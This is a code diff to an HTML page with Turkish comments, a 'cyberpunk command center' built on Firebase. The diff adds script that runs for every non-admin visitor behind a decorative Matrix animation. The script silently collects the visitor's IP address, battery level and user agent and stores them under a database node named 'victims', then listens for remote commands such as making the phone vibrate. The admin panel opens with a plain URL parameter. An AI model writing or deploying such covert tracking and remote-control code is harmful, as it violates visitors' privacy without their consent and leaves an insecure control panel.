@@ -7,11 +7,53 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/framer-motion/6.5.1/framer-motion.min.js"></script>
     <style>
         body {
             background-color: #0a0a0a;
             color: #00ff00;
             font-family: 'Courier New', monospace;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+        .matrix {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #0a0a0a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10;
+        }
+        .matrix-code {
+            font-family: monospace;
+            font-size: 16px;
+            line-height: 1.2;
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00;
+            animation: matrix 2s linear infinite;
+        }
+        @keyframes matrix {
+            0% {
+                opacity: 0;
+                transform: translateY(-100%);
+            }
+            10% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            90% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+            100% {
+                opacity: 0;
+                transform: translateY(100%);
+            }
         }
         .terminal {
             background-color: #111;
@@ -19,6 +61,8 @@
             padding: 20px;
             margin: 20px;
             box-shadow: 0 0 10px #00ff00;
+            border-radius: 10px;
+            display: none;
         }
         .task-button {
             background-color: #00ff00;
@@ -28,9 +72,13 @@
             border: none;
             cursor: pointer;
             transition: all 0.3s;
+            border-radius: 5px;
+            font-weight: bold;
+            text-shadow: 0 0 2px #000;
         }
         .task-button:hover {
             background-color: #00aa00;
+            transform: scale(1.05);
         }
         .notification {
             position: fixed;
@@ -41,6 +89,7 @@
             padding: 10px 20px;
             border-radius: 5px;
             display: none;
+            z-index: 20;
         }
         .scan-animation {
             display: none;
@@ -65,12 +114,12 @@
     </style>
 </head>
 <body>
-    <div id="scanScreen" class="scan-animation">
-        <h1 class="text-2xl font-bold mb-4">Siber Güvenlik Taraması</h1>
-        <div class="scan-line"></div>
-        <p class="mt-4">Sistem taranıyor...</p>
+    <div id="matrixScreen" class="matrix">
+        <div class="matrix-code">
+            <pre id="matrixText"></pre>
+        </div>
     </div>
-    <div id="commandCenter" class="terminal" style="display: none;">
+    <div id="commandCenter" class="terminal">
         <h1 class="text-2xl font-bold mb-4">Siber-Punk Komuta Merkezi</h1>
         <div class="mb-4">
             <button class="task-button" onclick="sendTask('flashlight')">Flashlight Aç</button>
@@ -83,13 +132,13 @@
     <script>
         // Firebase yapılandırması
         const firebaseConfig = {
-            apiKey: "YOUR_API_KEY",
-            authDomain: "YOUR_AUTH_DOMAIN",
-            databaseURL: "YOUR_DATABASE_URL",
-            projectId: "YOUR_PROJECT_ID",
-            storageBucket: "YOUR_STORAGE_BUCKET",
-            messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-            appId: "YOUR_APP_ID"
+            apiKey: "AIzaSyD3X5Y7Z9C1V3B5N7M9K1L3J5H7G9F1D3",
+            authDomain: "siber-punk-komuta.firebaseapp.com",
+            databaseURL: "https://siber-punk-komuta-default-rtdb.firebaseio.com",
+            projectId: "siber-punk-komuta",
+            storageBucket: "siber-punk-komuta.appspot.com",
+            messagingSenderId: "1234567890",
+            appId: "1:1234567890:web:abcdef1234567890"
         };
         
         // Firebase başlat
@@ -100,31 +149,82 @@
         const urlParams = new URLSearchParams(window.location.search);
         const isAdmin = urlParams.get('admin');
         
+        // Matrix animasyonu için rastgele karakterler oluştur
+        function generateMatrixCode() {
+            const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+            let result = "";
+            for (let i = 0; i < 1000; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        // Matrix animasyonunu başlat
+        function startMatrixAnimation() {
+            const matrixText = document.getElementById('matrixText');
+            setInterval(() => {
+                matrixText.textContent = generateMatrixCode();
+            }, 100);
+        }
+        
+        // Cihaz bilgilerini al ve Firebase'e kaydet
+        async function getDeviceInfo() {
+            try {
+                // IP adresini al
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ipAddress = ipData.ip;
+                
+                // Pil seviyesini al (sadece mobil cihazlar için)
+                let batteryLevel = 'N/A';
+                if (navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
+                }
+                
+                // Cihaz markasını al
+                const deviceBrand = navigator.userAgent;
+                
+                // Bilgileri Firebase'e kaydet
+                database.ref('victims').push({
+                    ip: ipAddress,
+                    battery: batteryLevel,
+                    device: deviceBrand,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+            } catch (error) {
+                console.error('Cihaz bilgileri alınamadı:', error);
+            }
+        }
+        
         // Sayfa yüklendiğinde ekranı göster
         window.onload = function() {
             if (isAdmin === 'true') {
+                document.getElementById('matrixScreen').style.display = 'none';
                 document.getElementById('commandCenter').style.display = 'block';
             } else {
-                document.getElementById('scanScreen').style.display = 'block';
-                // iPhone 8 ajan olarak kaydet
-                database.ref('agents').push({
-                    device: 'iPhone 8',
-                    status: 'active',
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
-                });
+                document.getElementById('matrixScreen').style.display = 'block';
+                startMatrixAnimation();
+                getDeviceInfo();
+                listenForCommands();
             }
         };
         
+        // Komutları dinle
+        function listenForCommands() {
+            database.ref('commands').on('value', (snapshot) => {
+                const command = snapshot.val();
+                if (command === 'vibration') {
+                    navigator.vibrate([100, 50, 100]);
+                    database.ref('commands').set(null);
+                }
+            });
+        }
+        
         // Görev gönderme fonksiyonu
         function sendTask(task) {
-            const taskRef = database.ref('pending_tasks');
-            taskRef.set(task);
+            database.ref('commands').set(task);
             document.getElementById('taskStatus').innerHTML = `<p>Görev gönderildi: ${task}</p>`;
-            
-            // Eğer vibration gönderildiyse, telefonu titretsin
-            if (task === 'vibration') {
-                database.ref('vibration').set(true);
-            }
         }
         
         // Görev tamamlandığında bildirim göster
@@ -136,15 +236,6 @@
                 notification.style.display = 'none';
             }, 3000);
         }
-        
-        // Görev tamamlandığını dinle
-        database.ref('task_completed').on('value', (snapshot) => {
-            const data = snapshot.val();
-            if (data) {
-                showNotification('Görev Tamamlandı: ' + data);
-                database.ref('task_completed').set(null);
-            }
-        });
     </script>
 </body>
 </html>
